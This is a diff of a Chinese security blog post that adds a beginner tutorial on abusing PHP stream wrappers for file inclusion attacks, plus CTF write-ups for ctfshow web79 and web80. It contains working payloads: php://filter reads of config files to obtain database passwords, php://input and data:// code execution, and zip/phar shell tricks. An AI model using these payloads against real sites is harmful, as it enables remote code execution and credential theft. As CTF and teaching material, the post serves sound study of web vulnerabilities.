@@ -27,7 +27,7 @@
 <meta property="og:description" content="文件包含函数(php):include($file):包含文件，出错时仅报警告（E_WARNING），程序继续执行。 require($file):包含文件，出错时报致命错误（E_COMPILE_ERROR），程序终止。 include_once($file):与 include 类似，但会先检查文件是否已被包含，避免重复包含。 require_once($file):与 require 类似，但">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-06-08T13:00:11.000Z">
-<meta property="article:modified_time" content="2025-06-09T17:22:49.244Z">
+<meta property="article:modified_time" content="2025-06-11T18:19:45.842Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -226,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          723 字
+          1.6k 字
         
       </span>
     
@@ -237,7 +237,7 @@
         
         
         
-          7 分钟
+          14 分钟
         
       </span>
     
@@ -288,6 +288,65 @@
 <p><strong>system($cmd)</strong>:执行系统命令并输出结果（如 system(“ls -l”);）。</p>
 <p><strong>exec($cmd)</strong>:执行系统命令并返回结果的最后一行（如 exec(“whoami”);）。</p>
 <p><strong>shell_exec($cmd)</strong>:通过 shell 执行命令，返回完整输出（如 <code>ls -l</code> 或 shell_exec(“ls”);）。</p>
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>伪协议是 PHP 提供的流封装器（Stream Wrappers），允许通过标准文件函数（如 include、file_get_contents）访问：</p>
+<p>格式：&lt;协议&gt;:&#x2F;&#x2F;&lt;路径&gt;（如 php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php）</p>
+<p>当存在文件包含漏洞时（如 include($_GET[‘file’])），伪协议能：</p>
+<p>1.绕过路径限制<br>（无法直接包含非脚本文件时）</p>
+<p>2.读取源码<br>（<strong>避免被 PHP 解析执行</strong>）</p>
+<p>3.实现远程代码执行（<strong>RCE</strong>）<br>（无需文件上传）</p>
+<p>4.利用压缩包&#x2F;临时文件<br>（隐藏恶意代码）</p>
+<hr>
+<h3 id="🌟-一句话理解伪协议"><a href="#🌟-一句话理解伪协议" class="headerlink" title="🌟 一句话理解伪协议"></a>🌟 一句话理解伪协议</h3><blockquote>
+<p><strong>伪协议 &#x3D; 给PHP的「特殊指令」</strong><br>告诉它不要简单打开文件，而是用特殊方式处理文件（比如解码&#x2F;执行代码&#x2F;读取压缩包）</p>
+</blockquote>
+<hr>
+<h3 id="🧩-文件包含漏洞是什么？"><a href="#🧩-文件包含漏洞是什么？" class="headerlink" title="🧩 文件包含漏洞是什么？"></a>🧩 文件包含漏洞是什么？</h3><p>假设有段危险代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">// 比如用户访问：http://site.com/?file=header.php</span><br></code></pre></td></tr></table></figure>
+<p>黑客如果把<code>file</code>参数改成<strong>伪协议指令</strong>，就能让PHP执行危险操作！</p>
+<hr>
+<h3 id="🛠️-五大伪协议详解（新手版）"><a href="#🛠️-五大伪协议详解（新手版）" class="headerlink" title="🛠️ 五大伪协议详解（新手版）"></a>🛠️ 五大伪协议详解（新手版）</h3><h4 id="1️⃣-php-filter（文件内容阅读器）"><a href="#1️⃣-php-filter（文件内容阅读器）" class="headerlink" title="1️⃣ php://filter（文件内容阅读器）"></a>1️⃣ <code>php://filter</code>（文件内容阅读器）</h4><p><strong>作用</strong>：<strong>读取文件源代码</strong>（不让PHP执行它）<br><strong>使用场景</strong>：偷看网站的配置文件（数据库密码等）<br><strong>实战示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=php://filter/convert.base64-encode/resource=config.php<br></code></pre></td></tr></table></figure>
+<p>✅ <strong>效果</strong>：看到<code>config.php</code>的Base64编码内容 → 解码后获得密码  </p>
+<blockquote>
+<p>📌 就像对快递员说：“别送包裹了！把里面的信<strong>拍照发我</strong>”（避免拆包裹触发炸弹）</p>
+</blockquote>
+<hr>
+<h4 id="2️⃣-php-input（代码植入器）"><a href="#2️⃣-php-input（代码植入器）" class="headerlink" title="2️⃣ php://input（代码植入器）"></a>2️⃣ <code>php://input</code>（代码植入器）</h4><p><strong>作用</strong>：<strong>把POST请求体中的代码当作文件执行</strong><br><strong>使用场景</strong>：直接控制服务器执行命令</p>
+<p><strong>用法</strong>：url加上php:&#x2F;&#x2F;input，同时post传参，bp抓包把post内容改成命令即可<br><strong>实战示例</strong>： </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://site.com/?file=php://input&quot;</span> -d <span class="hljs-string">&quot;&lt;?php system(&#x27;ls&#x27;); ?&gt;&quot;</span><br></code></pre></td></tr></table></figure>
+<p>✅ <strong>效果</strong>：服务器执行<code>ls</code>命令，列出文件  </p>
+<blockquote>
+<p>📌 就像把快递员打晕，<strong>把自己的炸弹塞进包裹</strong>让他配送</p>
+</blockquote>
+<hr>
+<h4 id="3️⃣-data-（代码直插器）"><a href="#3️⃣-data-（代码直插器）" class="headerlink" title="3️⃣ data://（代码直插器）"></a>3️⃣ <code>data://</code>（代码直插器）</h4><p><strong>作用</strong>：<strong>直接在URL里写代码执行</strong><br><strong>使用场景</strong>：快速测试代码执行<br><strong>实战示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=data://text/plain,&lt;?php echo &#x27;HACKED!&#x27;; ?&gt;<br></code></pre></td></tr></table></figure>
+<p>✅ <strong>效果</strong>：页面显示 <code>HACKED!</code>  </p>
+<blockquote>
+<p>📌 就像打电话时说：“别收快递了！我<strong>现场给你个炸弹</strong>，立刻引爆！”</p>
+</blockquote>
+<hr>
+<h4 id="4️⃣-zip-（压缩包提取器）"><a href="#4️⃣-zip-（压缩包提取器）" class="headerlink" title="4️⃣ zip://（压缩包提取器）"></a>4️⃣ <code>zip://</code>（压缩包提取器）</h4><p><strong>作用</strong>：<strong>执行压缩包里的PHP文件</strong><br><strong>使用场景</strong>：绕过文件上传检查<br><strong>实战步骤</strong>：</p>
+<ol>
+<li>创建 <code>shell.php</code> 内容 <code>&lt;?php system(&#39;id&#39;); ?&gt;</code></li>
+<li>压缩成 <code>evil.zip</code></li>
+<li>上传到服务器</li>
+<li>触发：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=zip:///var/www/uploads/evil.zip%23shell.php<br></code></pre></td></tr></table></figure>
+<p>✅ <strong>效果</strong>：执行压缩包中的恶意代码  </p>
+<blockquote>
+<p>📌 就像寄送<strong>伪装成玩具的炸弹</strong>，让快递员从玩具箱里取出炸弹</p>
+</blockquote>
+<hr>
+<h4 id="5️⃣-phar-（高级压缩提取器）"><a href="#5️⃣-phar-（高级压缩提取器）" class="headerlink" title="5️⃣ phar://（高级压缩提取器）"></a>5️⃣ <code>phar://</code>（高级压缩提取器）</h4><p>类似 <code>zip://</code>，但支持更多格式（如PHAR、TAR）  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=phar:///uploads/evil.phar/internal.php<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="🛡️-为什么防御难？"><a href="#🛡️-为什么防御难？" class="headerlink" title="🛡️ 为什么防御难？"></a>🛡️ 为什么防御难？</h3><p>伪协议利用了PHP的<strong>合法功能</strong>，防御需主动关闭：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; 在php.ini中关闭危险设置</span><br><span class="hljs-attr">allow_url_include</span> = <span class="hljs-literal">Off</span><br><span class="hljs-attr">allow_url_fopen</span> = <span class="hljs-literal">Off</span><br></code></pre></td></tr></table></figure>
+
+<hr>
 <h2 id="本地文件包含漏洞（LFI-Local-File-Inclusion）"><a href="#本地文件包含漏洞（LFI-Local-File-Inclusion）" class="headerlink" title="本地文件包含漏洞（LFI, Local File Inclusion）"></a>本地文件包含漏洞（LFI, Local File Inclusion）</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p><strong>1.&#x2F;?file&#x3D;..&#x2F;..&#x2F;flag.php 报错的原因:</strong></p>
@@ -320,6 +379,14 @@
 <p><strong>最终结果</strong>：</p>
 <p>​    页面显示Base64编码的源码：PD9waHAgJGZsYWc9ImN0ZnNob3d7…</p>
 <p>​    解码后得到原始代码</p>
+<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p><em>$file &#x3D; str_replace(“php”, “???”, $file);</em> </p>
+<p>改用base64编码php即可(没有&#x2F;i可以用大小写绕过)</p>
+<p>获取flag： ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p>
+<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p><em>$file &#x3D; str_replace(“php”, “???”, $file);   $file &#x3D; str_replace(“data”, “???”, $file);</em> </p>
+<p>用input协议，?file&#x3D;Php:&#x2F;&#x2F;input，抓post包，把post改成php语句即可运行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>也可以直接大小写绕过</p>
 
                 
               </div>
